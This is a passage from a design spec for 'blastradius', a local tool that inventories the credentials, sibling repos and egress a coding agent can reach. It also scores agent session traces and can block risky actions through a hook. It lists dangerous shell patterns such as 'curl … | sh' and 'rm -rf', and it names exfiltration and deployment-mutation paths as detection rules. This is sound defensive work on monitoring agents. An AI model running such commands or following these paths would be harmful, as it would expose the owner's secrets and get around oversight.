*Optional design note:* if a controlled HTTP response is ever wanted instead of a bare connect, use a HEAD to a major CDN — never a single fresh first-party endpoint whose downtime breaks the demo.
```
outbound connectivity reachable — 1.1.1.1, TLS ok, 19 ms
```
Evidence includes `{ "target":"1.1.1.1:443", "target_kind":"default", "dns_resolved":true, "resolved_ips":["1.1.1.1"], "resolved_ip_count":1, "tls_handshake":true, "latency_ms":19 }`. Severity: `Exposed` if open; `Notable` if DNS ok but handshake fails; `Info` if blocked. Privacy note in report: "No findings were sent. The remote necessarily observed source IP and timestamp."

---

## 13. Worktree comparison (the hook, not the product)

This adds **no new facts** about the machine — the second column equals the first by construction. Its job is to *earn attention* for the inventory (§7, §12) in the broad room and to make "a worktree is a directory" felt rather than merely asserted. It lands less on fleet operators (see *Product vs hook*, top); for them, prefer inventory breadth + the orchestrator matrix (§13.1). Keep it because it's near-free — same scan, different cwd — just don't sell it as the wow for the buyer.

**Claim:** worktrees do not constrain ambient authority.

**Flow:** locate main repo root → scan from repo root → **compute `discovery_roots` once, anchored to the main repo (§12.8)** → create temp detached worktree at HEAD → scan from the worktree **using the same env snapshot and the same `discovery_roots`** → normalize → diff by class/scope → render → remove worktree.

**Temp location:** `$TMPDIR/blastradius-worktree-<random>` (not inside the user's repo unless necessary). **Worktree creation:** `git worktree add --detach <tmpdir> HEAD`.

**Cleanup:** on success `git worktree remove --force <tmpdir>`; on failure/Ctrl-C attempt removal and, if it fails, print the exact manual command (don't hide it):
```
Temporary worktree cleanup failed. Remove it manually with:
  git worktree remove --force /tmp/blastradius-worktree-a1b2c3
```

**Dirty trees don't block compare.** The worktree is at HEAD, so untracked/uncommitted files (e.g. a local `.env`) may be absent. The renderer explains any `CurrentRepo` delta:
```
Note: current-repo-local files differ because the temporary worktree is checked out at HEAD.
This does not affect the ambient-authority comparison.
```

**Normalization** into comparable metrics — AWS profile count/names, SSH key count, secret env key names/lengths, sibling count, lateral-secret repo count, git remote hosts, credential-source hosts, egress status. Never compare raw temp paths.
```rust
pub struct FindingSummary { pub class: FindingClass, pub scope: FindingScope, pub metric: String, pub value: ComparableValue }
pub enum ComparableValue { Bool(bool), Count(u64), StringSet(BTreeSet<String>), Status(String) }
```

### 13.1 Example output — **PUNCH PROTECTED (Fix 4): ambient dominates, local delta is a footnote**
```
══ worktree comparison ════════════════════════════════════════

  AMBIENT BLAST RADIUS                  repo root      worktree
  ───────────────────────────────────────────────────────────
  AWS profiles                          2              2
  SSH private keys                      3              3
  secret-like env vars                  4              4
  GitHub auth source                    present        present
  sibling repos readable                23             23
  sibling repos with secrets            7              7
  git credential hosts                  2              2
  outbound connectivity                 open           open

  ┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄
  ►  working directory changed.  ambient blast radius UNCHANGED.
     A git worktree is a directory-level convenience, not a
     security boundary.

  (footnote) current-repo-local checkout differs as expected — .env
  files 1→0, tracked files differ — because the worktree is at HEAD.
  This is not part of the ambient comparison.
```
The ambient block and the one-line verdict carry the hook; the `CurrentRepo` delta is a quiet footnote so a viewer can't half-read it as "the worktree changed something." Use the word **"identical"** only when the normalized ambient set is actually identical; otherwise say **"unchanged"** for the ambient scopes.

**Orchestrator / ax columns — the buyer's payload (post-MVP).** Extend to a matrix with columns for the tools the operator actually runs — Conductor, cmux — plus ax (creds → scoped token, siblings → absent, egress → dropped). The cross-orchestrator row is the non-obvious claim and the close for fleet operators; the bare worktree column is just the warm-up. `--compare-ax` invokes existing ax, not new code — add it the day ax is reliable. The two-column worktree reveal stands alone for the broad room; the **matrix is what you show the buyer.**

---

## 14. Report formats

**Terminal (default):** readable in 80–100 cols, deterministic ordering. Sections: `CREDENTIALS` → `CROSS-REPO` → `GIT WRITE` → `EGRESS` → `PROCESS` → `HOST PERSISTENCE` → `SYSTEM INFO` → `WORKTREE COMPARISON` → `WHAT WOULD CONTAIN THIS`.

**Markdown (`--report` → `blastradius-report.md`):** timestamp, version, platform, value-redacted command shape, privacy note, findings by class, comparison table (if any), limitations, containment guidance. No values.

**JSON (`--report` → `blastradius-report.json`):** stable from day one so the future matrix mode needs no core rewrite.
```json
{
  "schema_version": "1.0",
  "tool": { "name": "blastradius", "version": "0.1.0" },
  "run": { "id": null, "timestamp": "2026-06-08T12:00:00Z", "mode": "compare" },
  "contexts": [ { "label": "repo-root", "cwd": "~/code/app", "repo_root": "~/code/app",
                  "git": { "is_repo": true, "branch": "main", "head_sha_short": "abc1234" } } ],
  "findings": [ { "context": "repo-root", "id": "aws.credentials.profiles", "class": "Credentials",
                  "scope": "Ambient", "title": "AWS credentials reachable", "severity": "Exposed",
                  "confidence": "Confirmed", "evidence": { "profile_count": 2, "profiles": ["default","prod"] } } ],
  "comparison": { "ambient_unchanged": true, "rows": [] }
}
```
No machine-stable run ID by default; if useful, generate an ephemeral random ID and don't persist it.

---

## 15. "What would contain this"

End every report with sober, capability-oriented categories — **not an ad**:
```
What would contain this:
  • Credential substitution — scoped, short-lived creds per agent instead of
    inheriting your full shell, SSH, cloud, and git identity.
  • Filesystem isolation — mount only the task repo + explicit deps; no broad
    $HOME or sibling-repo access.
  • Egress control — default-deny outbound, then allowlist what the task needs.
  • Process isolation — prevent same-user process inspection / access to other
    local dev tools.
  • Server-side enforcement — branch protection, review, token scopes still
    matter; local worktrees don't enforce them.
```

**Session layer — quantified (§23.10 containment simulator).** The categories above are a
static checklist. For a scored agent session, the simulator recomputes the *same*
blast-radius score under each control toggle and reports the measured reduction. Category →
toggle: credential substitution → `scoped_temp_cloud_creds`; filesystem isolation →
`repo_only_filesystem`; egress control → `no_egress`; process isolation → `process_isolation`;
plus a dedicated `no_ssh_agent` toggle (§11). Server-side enforcement stays server-side and
is not locally simulable (§12.10) — the simulator surfaces the irreducible residual it leaves
behind rather than pretending isolation removes it.

---

## 16. Distribution

**Artifacts** for `aarch64-apple-darwin`, `x86_64-apple-darwin`, `x86_64-unknown-linux-musl`, `aarch64-unknown-linux-musl`. Each release: `blastradius-<ver>-<target>.tar.gz` + `SHA256SUMS`. **Host on GitHub Releases** (no infra to maintain). **Defer cosign/signing and Homebrew until after the event** — checksums are enough for MVP trust.

There is intentionally no curl-piped shell installer. Manual installs use the release tarball plus
`SHA256SUMS`; the npm wrapper below is the convenience path.

**npm wrapper — run-time fetch only, NEVER `postinstall` (Fix 5):**
```
npx @amlalabs/blastradius scan
npx @amlalabs/blastradius compare
```
The package is a tiny JS shim that, **on explicit invocation**, detects OS/arch, downloads-or-caches the binary, **checksum-verifies**, and execs it. Cached binaries are checked against a regular-file, size-limited sidecar SHA-256 before execution; cache misses or mismatches redownload from the versioned release. Downloads are HTTPS-only, redirect-limited, timeout-bounded, and size-bounded; extraction is in-process with bounded gzip expansion and rejects path traversal, symlink/hardlink entries, unsupported tar entries, and archives that do not contain exactly one `blastradius` binary. It MUST NOT fetch or execute anything from an `install`/`postinstall` lifecycle hook, and contains no scanning logic. Shipping a fetch-and-run-on-install package is the exact supply-chain pattern `blastradius` exists to surface — doing it ourselves is both hypocritical and a real risk, and someone will gladly point it out.

---

## 17. Implementation plan (~5 days to June 13)

**Day 1 — skeleton, redaction, first credential probes.** clap CLI; `Context`; `Probe` trait; runner; `Finding`; terminal renderer; **Layer-2 final sweep + canary self-test skeleton**; AWS, SSH, env probes. *DoD:* `cargo run -- scan` prints `CREDENTIALS` with AWS/SSH/ENV and **no raw values**.

**Day 2 — `.env`, shell history, siblings.** `.env` discovery + counts; history pattern counts; sibling enumeration (**with §12.8 anchoring wired in from the start**); lateral secrets; scan limits; path shortening; deterministic ordering. *DoD:* `cargo run -- scan --verbose` shows current + sibling exposure without leaking values.

**Day 3 — worktree compare + egress (framing on top of the engine).** git context; temp worktree harness; cleanup guard; **shared `discovery_roots`**; normalization; punch-protected comparison renderer; egress (neutral host, always runs). *DoD:* `cargo run -- compare` shows side-by-side ambient repo-root vs worktree. The compare is near-free on top of the engine — so **the engine (Days 1–2) is the asset and the real line in the sand: if the back half slips, a clean reachability inventory alone is still the product.**

**Day 4 — reports, polish, installability.** Markdown + JSON renderers; `--report`; terminal polish (clarity *is* the product — spend here); README; safety docs; release build; npm shim skeleton (no postinstall); manual release install docs. *DoD:* `blastradius compare --report` produces clean local reports.

**Day 5 — hardening, fixtures, rehearsal.** Redaction fixture tests; malformed-file tests; large-file traversal tests; macOS + Linux smoke + fresh-VM test; README examples; release artifacts + checksums; final copy pass. *Optional:* registry/Docker/kube probes; `--compare-ax` only if ax is already reliable. **Cut unfinished features aggressively.**

> **Scope discipline:** the asset is the reachability inventory (Days 1–2) — protect it first. The two most tempting ratholes are the redaction type-system (dropped — §4.3) and the test matrix (keep to §18); don't let either eat the engine. The worktree compare is framing, not the deliverable — cut it before you cut inventory coverage.

---

## 18. Test plan

- **Redaction:** fixtures with `ghp_TESTSECRET_SHOULD_NOT_LEAK`, `github_pat_…`, `sk-test_…`, `AKIATESTSECRET`, a PEM block. Assert none appear in terminal/MD/JSON/errors/logs.
- **Probes:** temp dirs for fake AWS config, SSH dir, `.env`, sibling repos, `.git-credentials`, shell history; assert counts and no values.
- **Worktree:** temp `git init` repo; run `compare`; assert worktree created, both contexts scanned, worktree removed, **ambient findings equal (shared fake home + shared roots), siblings equal**; dirty-repo case: untracked `.env` in root, absent in worktree, renderer explains the `CurrentRepo` delta.
- **Egress:** no external network in unit tests — mock behind `trait HttpClient { fn connect(&self, target:&str, timeout:Duration) -> Result<EgressResult>; }`; opt-in integration test `cargo test --features network-tests`.
- **Performance:** generated trees — assert default scan is fast on 100 repos / 10k files / large history / nested `node_modules`; hard traversal caps.
- **Snapshot:** terminal snapshot tests to keep output stable.

---

## 19. Error handling

Degrade gracefully — `AWS config unreadable — permission denied`, never a panic. A probe error doesn't abort the run unless it blocks core operation (skip bad `.env` lines; count unreadable files and continue; report bad YAML and continue; skip git probes if `git` missing; `compare` exits cleanly if not a repo).

**Exit codes:** `0` success · `1` runtime error · `2` invalid usage · `3` compare outside a git repo · `4` `--fail-on` / `audit-history --fail-on-score` threshold met. Findings don't cause nonzero exit by default; CI uses `scan --fail-on exposed` (ambient) or `audit-history --fail-on-score N` (retro-hazard, reusing code 4). (The PreToolUse `--hook` that signals block/allow via a JSON decision rather than exit status, §23.12, is post-MVP.)

---

## 20. README structure

Lead with the worktree claim.
```
# blastradius
A local diagnostic that shows what a coding agent running as you can reach.

## Why this exists
Worktrees are not security boundaries. Coding agents inherit ambient authority.

## Install        npx @amlalabs/blastradius compare   ·   (or a release tarball + SHA256SUMS)
## What it checks  credentials, env vars, sibling repos, git auth surface, egress
## What it never does
  no telemetry · no secret values · no exploit behavior · no repo secret scanning
  no findings or secret values leave the machine; the outbound connections are the
  always-on egress + cloud-metadata reachability checks (no scan data sent), the
  opt-in dashboard --ai call (value-free findings only), and the dashboard page's
  CDN/webfont asset loads (no scan data)
## Demo            (terminal screenshot of the worktree reveal)
## Interpreting results   reachability, not malice
## What would contain this  credential substitution · filesystem isolation · egress control
## Development     cargo test · cargo run -- compare
```

---

## 21. What changed in v2 (and why)

**Carried over from the refined draft (correctness, kept):**
1. **Ambient vs current-directory split in `compare`** (`FindingScope`). "IDENTICAL" was wrong — an untracked `.env` won't exist in a `HEAD` worktree, so a `1→0` row makes the tool look sloppy. Splitting `Ambient` from `CurrentRepo` is *more* persuasive: it pre-empts the obvious objection.
2. **"Push likelihood," not "can push"** — local credential presence ≠ server authorization.
3. **GitHub scope detection reads local config only** — `gh auth status`/API calls would query GitHub; the probe never makes that call.
4. **No `--no-redact`; canary self-test instead** — a raw-secret flag is a demo/CI foot-gun.

**New in v2 (the review fixes):**
5. **Sibling-repo discovery is anchored to the main repo and shared across contexts (§12.8).** Without this, `git rev-parse --show-toplevel` inside the worktree resolves discovery to `$TMPDIR`, the worktree shows *fewer* siblings, and a sharp viewer concludes the worktree reduced reach — inverting the thesis on stage. Reachability is a property of user authority, not cwd neighborhood.
6. **Egress probe no longer depends on first-party infra (§12.11).** Default = DNS-resolve + TLS-connect to a major always-up anycast host; no bespoke `/ping`, no SPOF whose downtime breaks the demo, and you're not the host logging every attendee's IP. (Artifact hosting also moved to GitHub Releases.)
7. **Env-secret probe is curated-first (§12.5).** The broad regex flagged `KEYMAP`/editor vars — the most likely on-stage embarrassment in a room grading you on exactly this. Curated high-signal names drive `Exposed`; the regex is opt-in `--env-broad` at `Notable`. Cleaned the garbled severity line and the `HOMEBREW_…?` artifact.
8. **Punch protected (§13.1).** The ambient block + one-line verdict dominate; the `CurrentRepo` delta is demoted to a footnote so it can't compete with the reveal.
9. **Scope trims / optics:** dropped the redaction newtype layer (Layer 1 + final sweep + canary carry the safety); deferred cosign/Homebrew past the event; **npm wrapper fetches at run-time on explicit invocation only — never via `postinstall`**, since that's the exact pattern the tool warns about.

---

## 22. MVP definition of done (the contract)

Complete when `npx @amlalabs/blastradius compare` reliably produces a report showing: AWS profile presence; SSH private-key presence; GitHub/git credential-source presence; secret-like env vars (curated); `.env` files in current + sibling repos; shell-history match counts; sibling-repo count (correctly anchored); git remotes + push-likelihood; egress status; **repo-root vs worktree ambient comparison with the punch intact**; containment guidance; and **no secret values anywhere**.

Does **not** need: `--compare-ax`; benchmark matrix; cloud API validation; GitHub scope verification; Docker/Kube/GCP/Azure probes; Windows; GUI; hosted dashboard. The §23/§24 session layer was beyond the MVP contract (the reachable-surface inventory is the MVP); it has **since been built** (§24.0), but the MVP DoD is unchanged. Still genuinely not built: live process wrapping (`session -- <cmd>`), the PreToolUse hook, and native ingest of agent traces beyond Claude Code / Codex (other agents are detection-only, §24.1).

A clean, trustworthy local binary whose product is the reachable-surface inventory. The worktree reveal is the hook that gets the broad room to look at it; the orchestrator matrix (post-MVP) is what closes the fleet operators who are the buyer. The §23 session blast-radius scoring layer is an **additive runtime overlay** on top of this ambient contract: it consumes a scan's value-free JSON (§14) as its denominator, adds no new probes and no new secret-value surface, and does not alter the §22 ambient DoD.

---

## 23. Session blast-radius scoring layer (runtime overlay)

> **New in v2.2 — an additive overlay on the existing static scanner, not a second
> scanner.** Everything in §1–§22 measures the **static ambient map** — *"what can code
> running as me reach?"* — and **that reachable-surface inventory is unchanged and remains
> the asset (the denominator).** This layer adds a thin **runtime overlay**: given what an
> agent session *actually did*, which reachable capabilities became **relevant** (the
> numerator)? It then asks *how bad could it have been, and which controls would shrink it*
> (the response). It joins observed session events against blastradius's **real §11–§12
> findings** — it adds **no new probe and no new static regex list**.
>
> **Three registers.** (1) **Reachable** — the ambient map (§1, §7, §11–§12), the
> denominator, unchanged. (2) **Touched** — observed `AgentEvent`s joined against the real
> findings on *this* machine. (3) **Response** — the blast-radius score, the named toxic
> combinations (security paths), and the quantified containment simulation.
>
> **One line (extended):** *blastradius shows what an agent can reach, what it actually
> touched, and how bad the session could have been — and which controls would shrink it.*
> The identity: **ambient reachability (§9 `Finding`s) + observed agent behavior
> (§23.3 `AgentEvent`s) + sensitive-asset classification = blast-radius score (§23.7).**
>
> **Standing discipline (load-bearing, reconciles §4/§5).** The layer is *reachability,
> not intent* (§5) and **value-free** (§4.2): traces carry paths/commands/hosts but the
> scorer and `SessionReport` **never** emit secret values. It is **read-only by default**
> (§4.1) — its only state-changing capability is the opt-in PreToolUse `block` verdict
> (§23.12). The **deterministic engine computes the score**; the `--ai` layer **only
> explains already-grounded evidence — it never determines or alters the score.**

### 23.1 `src/session/` module layout

A sibling of `src/probes/`, `src/analyze/`, `src/dashboard/`. It **consumes** the existing
data model (`crate::finding::{Finding, FindingId, FindingScope}`,
`crate::severity::{Severity, Confidence}`, `crate::report::{RunReport, redaction}`) and
**adds no probes**.

```
src/session/
  mod.rs
  trace.rs              # AgentEvent, SessionTrace; ingest + adapters (frozen INPUT)
  normalize.rs          # AgentEvent -> NormalizedEvent; Layer-1 redaction; Signal tagging
  classify.rs           # THE JOIN: NormalizedEvent x baseline Finding -> ActivatedCapability/Reason
  score.rs              # deterministic additive + multiplier + escalation engine; containment sim
  toxic_combinations.rs # event(s) x finding(s) -> named security PATH (ToxicCombination)
  report.rs             # assemble SessionReport; JSON + terminal renderers (Layer-2 swept)
  discovery/            # native transcript discovery + per-agent parsers (Layer-0 extract)
  retro.rs              # retro-hazard: re-resolve historical combos vs today's baseline
  history.rs            # HistoryAuditReport across discovered sessions
```

**Pipeline (deterministic, read-only — §4.1):**
`trace.rs` ingest → `normalize.rs` (Layer-1 redaction at the boundary) → `classify.rs`
joins normalized events against a **baseline** of real `Finding`s (a prior `scan`'s
value-free JSON, §14, or an implicit live scan) → `toxic_combinations.rs` + `score.rs`
derive paths and the number → `report.rs` emits the `SessionReport`. The baseline is the
bridge to the existing tool: `classify.rs` joins against the **same `Finding` values** the
§11–§12 probes already produce on this machine (~35 probes / ~30 stores).

### 23.2 The JOIN — the evidence graph (the heart of the product)

The asset classifier is **not** a new regex list — it is a **JOIN of observed session
events against blastradius's real §11–§12 findings**. Canonical example:

```
observed:         file_write .github/workflows/deploy.yml
ambient findings: git.push_likelihood = likely    (GitWrite / Ambient)
                  egress.connectivity = open       (Egress / Network)
                  github.token_source reachable    (Credentials / Ambient)
derived path:     "production deployment mutation possible"
```

Session events and ambient findings are modeled as one graph:

- **Nodes** — `EventNode(AgentEvent)` and `FindingNode(Finding)` (the loaded baseline, i.e.
  a §14 scan report's `findings[]`).
- **Edges** — `Activates(event → finding)`: an event activates a finding when their
  **join key** matches by `FindingClass`/`FindingScope` and by path/host/command overlap
  with the finding's redacted `evidence`.
- **Derived** — `ActivatedCapability` (one or more `Activates` edges → a named activated
  capability) and `ToxicCombination` (§23.8: two or more co-present capabilities/findings →
  a named security path with severity + evidence).

A reachable finding that **no** event activates stays in the denominator and does **not**
score; only activated (joined) findings enter the numerator. *This is what keeps a benign
session low even on a machine with full ambient authority.* The classifier emits an
`ActivatedCapability` and a `Reason` per join:

```rust
pub struct ActivatedCapability {
    pub capability: String,            // e.g. "production deployment mutation possible"
    pub event_ixs: Vec<usize>,         // observed events that activated it
    pub finding_refs: Vec<FindingId>,  // the REAL ambient findings it joins against
}
```

### 23.3 Frozen input contract — `AgentEvent` / `SessionTrace` (`trace.rs`)

The cross-slice input contract; field names and serde tags are **frozen** so the engine,
hook, fixtures, and dashboard agree. Events carry **paths / commands / hosts only — never
file contents or secret values** (§4.2, §23.11).

```rust
/// One observed agent action. Serde-tagged so transcripts/fixtures are stable.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "type", rename_all = "snake_case")]
pub enum AgentEvent {
    FileRead     { path: String },
    /// `diff` is OPTIONAL on input and DROPPED in normalize.rs before it can reach
    /// scoring, evidence, or any renderer (§4.2/§4.3, §23.11).
    FileWrite    { path: String,
                   #[serde(default, skip_serializing_if = "Option::is_none")]
                   diff: Option<String> },
    ShellCommand { command: String },
    NetworkAccess{ host: String, port: u16 },
    /// `reason` is OPTIONAL human-typed free text — swept in normalize.rs; never scored.
    Approval     { approved_by: String,
                   #[serde(default, skip_serializing_if = "Option::is_none")]
                   reason: Option<String> },
    /// `input` is OPTIONAL — dropped/redacted in normalize.rs; only server/tool survive.
    McpCall      { server: String, tool: String,
                   #[serde(default, skip_serializing_if = "Option::is_none")]
                   input: Option<serde_json::Value> },
}

/// Frozen INPUT; (de)serialized from checked-in traces/*.json and parsed transcripts.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SessionTrace {
    pub session_id: String,
    pub agent: String,                  // "claude-code" | "codex" | "cursor" | "mock"
    pub repo: Option<String>,           // repo slug / shortened label (never absolute $HOME)
    pub started_at: Option<String>,     // RFC3339
    pub events: Vec<AgentEvent>,
    #[serde(default)] pub privileged_user: bool,  // drives privileged_user x1.2 (§23.7)
    #[serde(default)] pub after_hours: bool,       // drives after_hours x1.1 (§23.7)
}
```

**Trace sources (`trace.rs`).** (1) **Claude Code transcripts** —
`~/.claude/projects/<repo>/*.jsonl` (real tool calls; the honest default path);
(2) a **PreToolUse hook** for *live* scoring (may optionally **BLOCK** per policy
decision); (3) **mock fixtures** (`traces/{benign,risky}.json`). **Codex** is a
**real parser** (`discovery/parse/jsonl_codex.rs`) alongside Claude Code; only
**Cursor and other agents are detection-only** (discovered but not yet parsed) —
stated honestly; `agent` carries the real source and no adapter claims live capture
it does not have.

### 23.4 Normalization & value-free signal taxonomy (`normalize.rs`)

`normalize.rs` is the **Layer-1** redaction boundary (§4.3) and turns each `AgentEvent`
into a `NormalizedEvent` carrying a value-free **`Signal`** plus an `approved` flag. At this
boundary: `FileWrite.diff` is **dropped**; `ShellCommand.command`, `McpCall.input`, and the
free-text `Approval.reason` are each run through `redaction::sweep`, with inline secret
assignments (`export TOKEN=…`) and credential URLs (`https://user:pass@host`) reduced to the
`EnvVarMeta { key, value_len }` shape (§4.3/§12.5); dangerous-pattern detection reports only
the **pattern category**, never the matched substring. `network_access.host` is redacted to
the literal `[custom egress target]` token (the same token §4.6/§12.11 use) whenever it is
custom/credential-bearing or fails the §4.6 host checks. Nothing past this boundary carries
a raw value.

```rust
pub struct NormalizedEvent { pub signal: Signal, pub event_ix: usize, pub approved: bool }

/// Names match the §23.7 base-weight keys.
pub enum Signal {
    ReadSecret, ModifiedProductionDeploy, ShellCommand, NetworkAccess,
    EditedAuthOrPaymentOrSecurityCode, DangerousShellPattern,
    ModifiedDependencyManifest, ExternalMcpCall, HumanApprovedRiskyAction,
}
```

### 23.5 Signal → `FindingClass` mapping (no new probe surface)

Each scoring **signal** fires only when an event **joins** an ambient finding of the named
class/scope. The classifier reuses §11 entirely and adds *no* detection regex. All ids are
**real** ids emitted by existing probes (verified against `src/probes`).

| Signal | Trigger event | Joined finding (class / real id) |
|---|---|---|
| `read_secret` | `file_read`/`shell_command` reading a secret store | Credentials, CrossRepo — `aws.credentials.profiles`, `ssh.private_keys`, `git.credential_store`, `cross_repo.dotenv`, `env.secret_names`, `github.token_source`, `browser.session_stores` |
| `modified_production_deploy` | `file_write` to deploy workflow / k8s manifest | GitWrite — `git.push_likelihood` |
| `shell_command` | any `shell_command` | Process — `process.*` (e.g. `process.sandbox_reach`) |
| `network_access` | `network_access` / external fetch | Egress, Network — `egress.connectivity` |
| `edited_auth/payment/security_code` | `file_write` to auth/payment/security path | CurrentRepo + GitWrite (`git.push_likelihood`) |
| `dangerous_shell_pattern` | `shell_command` matching a dangerous pattern (`curl … \| sh`, `rm -rf`, `chmod 777`, `base64 -d`) | Process — `process.*` |
| `modified_dependency_manifest` | `file_write` to `package.json`/`Cargo.toml`/`requirements.txt`/`go.mod`/lockfile | CrossRepo, CurrentRepo |
| `external_mcp_call` | `mcp_call` to a non-local server | Egress/Network — `egress.connectivity` |
| `human_approved_risky_action` | `approval` covering a risky action | (modifier; §23.7) |

Escalation inputs come from `host.privilege_escalation` (groups + NOPASSWD sudo, docker
group) and `host.privileged_reachability` — see the escalation amplifier in §23.7.

### 23.6 Scoring — additive base weights × multipliers (deterministic)

**Per-signal aggregation (diminishing returns).** Base weight is summed **per distinct
signal**, not per event: a signal's first occurrence counts its full weight, each repeat
adds only 20% of the weight, capped at +1× (so any one signal contributes at most 2× its
base). This keeps raw event COUNT from dominating — e.g. 551 `shell_command` events
contribute ≤ +20, not +5510 — so the score reflects *which distinct dangerous capabilities*
a session exercised, and containment recompute (dropping a suppressed signal) moves the
score proportionally instead of being lost in noise.

**Base weights** (a signal contributes only when it joins a finding per §23.5):

```
read_secret                        +30
modified_production_deploy         +25
shell_command                      +10
network_access                     +15
edited_auth/payment/security_code  +20
dangerous_shell_pattern            +25
modified_dependency_manifest       +15
external_mcp_call                  +15
human_approved_risky_action        -10
```

**Multipliers** (applied to the additive base sum):

```
production_repo            1.4
privileged_user            1.2
unapproved                 1.3
multi-sensitive-domain     1.25   (events touch >=2 sensitive domains: creds / deploy / auth-payment / network)
after_hours                1.1
escalation_amplifier       1.0 .. 1.5   (driven by host.privilege_escalation / host.privileged_reachability;
                                         1.5 when escalation is reachable AND the session ran a shell_command)
```

**Formula:** `risk_score = saturate( base_sum × Π(active multipliers) )`, mapped to 0..100 with a **soft tail**: identity up to `T = 75` (Low/Medium/High bands unchanged), then `T + (100-T)·(1 − e^−(raw−T)/S)` (`S = 130`) above it, asymptotic to 100. A plain hard clamp pinned every active session on a high-ambient-risk machine to a flat 100; the soft tail spreads the worst sessions across ~80..99 so the **distinct-risk ranking** (below) can tell them apart.

**Ranking (dashboard top-N).** The session view shows a **distinct-risk** set: one representative per distinct `risk_score` (the worst example at that level — most toxic paths, then largest weight magnitude), taking the N highest distinct scores. This maximizes both score uniqueness and the top scores, instead of rendering N identical 100s. Sessions scoring 0 are excluded.

**The ambitious upgrade — score toxic combinations (PATHS), not isolated events.** When
both legs of a §23.8 combination are present, the combination is emitted and contributes a
**path weight** to `base_sum` (`critical +40`, `high +25`, `medium +15`) so an activated
security *path* dominates the score over the sum of its isolated events. *(This path-weight
scale is the one number not literally in the brief — see §23.18, confirm with P1 before
freezing.)*

**Levels (`RiskLevel`):** `0–24 low · 25–49 medium · 50–74 high · 75–100 critical`.

**`policy_decision`:** `critical → block · high → require_review · otherwise allow`
(threshold configurable; CI uses `--fail-on-score`; the PreToolUse hook may BLOCK).

### 23.7 The escalation amplifier (honest keying)

The escalation amplifier is driven by the **actual presence** of `host.privilege_escalation`
/ `host.privileged_reachability` in the baseline (per the brief) — **not** by toxic-rule
activation. A rule's `escalation` flag only marks that its trigger set *includes* one of
those findings; the amplifier applies solely when that finding is the one that actually
matched. A rule that activated via a non-escalation leg (e.g. `post_root_host_visibility`
matching `process.afunix_docker_sock` while `host.privilege_escalation` is **absent**) does
not synthesize an escalation the baseline never reported.

### 23.8 Toxic-combination catalog — event(s) × ambient finding(s) → named path

The catalog is the concrete form of the KEY INSIGHT: the classifier is the JOIN, named.
Each entry is a deterministic, value-free `ToxicCombinationRule`. The engine — never the
`--ai` layer — evaluates rules and emits `ToxicCombination { name, severity, evidence[] }`.

```rust
pub struct ToxicCombinationRule {
    pub name: &'static str,                  // stable snake_case id (e.g. "exfiltration_path")
    pub title: &'static str,                 // human label (e.g. "Credential exfiltration path")
    pub event_triggers: Vec<EventPredicate>, // observed AgentEvent classes that must ALL match
    pub finding_triggers: FindingTrigger,    // ambient FindingId(s) that must be present
    pub severity: RiskLevel,                 // medium | high | critical (never low)
    pub derived_path: &'static str,          // what the JOIN means, in reachability terms
    pub evidence_template: &'static str,     // value-free (§23.11)
    pub escalation: bool,                    // trigger set includes an escalation finding (§23.7)
}
pub enum FindingTrigger { None, All(Vec<&'static str>), AnyOf(Vec<&'static str>), AllOf(Vec<FindingTrigger>) }
```

**Activation gate (load-bearing).** A rule activates iff **(a)** every `EventPredicate`
matched at least one normalized `AgentEvent` in the session — **mandatory for all six rules**
— AND **(b)** every *required* ambient finding is present in the baseline at confidence
≥ `Likely` (or severity ≥ `Notable`). No rule activates from ambient findings alone (that is
the static §12 denominator). The lone exception is `high_review_risk`, whose
`finding_triggers` are `None`, so clause (b) is vacuous: it is a **pure review-control-gap
signal** (sensitive-code `file_write` with no covering `approval`), not a JOIN — documented
as such so a reader never mistakes it for ambient evidence. **No observed action, no path.**

| `name` (stable id) | display `title` | event_triggers (observed) | finding_triggers (real `FindingId`) | severity |
|---|---|---|---|---|
| `exfiltration_path` | Credential exfiltration path | `read_secret` **and** (`network_access` *or* outbound `dangerous_shell_pattern`) | `All[egress.connectivity]` + the classifying credential finding `AnyOf[aws.credentials.profiles, env.secret_names, ssh.private_keys, git.credential_store, browser.session_stores]` | critical |
| `source_control_mutation_path` | Source-control mutation path | git-write `shell_command` (`push`/`commit`/`tag`/`remote set-url`) **or** `file_write` to a tracked file | `All[git.push_likelihood]` (push reachability already encodes a working credential — readable key, token, or live ssh-agent; requiring `ssh.agent_socket` separately wrongly marked the path remediated when only the agent was down) | high |
| `post_root_host_visibility` | Post-root host visibility | container-runtime `shell_command` (`docker`/`podman run`/`exec`) **or** `mcp_call` on the docker socket | `AllOf[ AnyOf[host.privilege_escalation, process.afunix_docker_sock], AnyOf[cross_repo.sibling_repos, cross_repo.lateral_secrets] ]` | critical |
| `saas_session_hijack` | SaaS session hijack | `file_read` of a browser session/cookie store **and** `network_access` | `All[browser.session_stores, egress.connectivity]` | high |
| `production_deployment_path` | Production deployment path | `file_write` classified `modified_production_deploy` (`.github/workflows/*.yml`, CI/deploy manifests) | `All[git.push_likelihood]` | critical |
| `high_review_risk` | Unreviewed sensitive-code change | `file_write` classified `edited_auth/payment/security_code` **and** *absence* of a covering `approval` | `None` (review-control-gap exception; optionally *amplified* by `AnyOf[git.push_likelihood, egress.connectivity]`) | high |

Reserved for a future `persistence_path` rule (not in the MVP catalog): a `file_write` to a
writable deferred-exec sink — `host.deferred_exec_sinks` / `host.autostart_sinks` /
`host.writable_git_hooks`.

**Wording boundary (reconciles §3/§5).** The catalog **names paths; it does not assert
exploitation.** A `production_deployment_path` says a reachable ambient capability
*composes* with an observed action — not that a deploy occurred, a token is valid, or
branch protection (server-side, unverified per §12.10) was bypassed. Severity reflects the
blast radius *if* the path were taken.

### 23.9 Frozen output contract — `SessionReport` (`report.rs`)

The second frozen contract (paired with `AgentEvent`). `score.rs` fills the numbers;
`toxic_combinations.rs` fills `toxic_combinations`; `report.rs` assembles and renders.

```rust
pub struct SessionReport {
    pub session_id: String,
    pub agent: String,
    pub repo: Option<String>,
    pub risk_score: u8,                          // 0..=100 (capped)
    pub risk_level: RiskLevel,                   // Low 0-24 | Medium 25-49 | High 50-74 | Critical 75-100
    pub policy_decision: PolicyDecision,         // Block | RequireReview | Allow
    pub summary: String,
    pub activated_capabilities: Vec<String>,     // capability names; full join detail lives in reasons[]
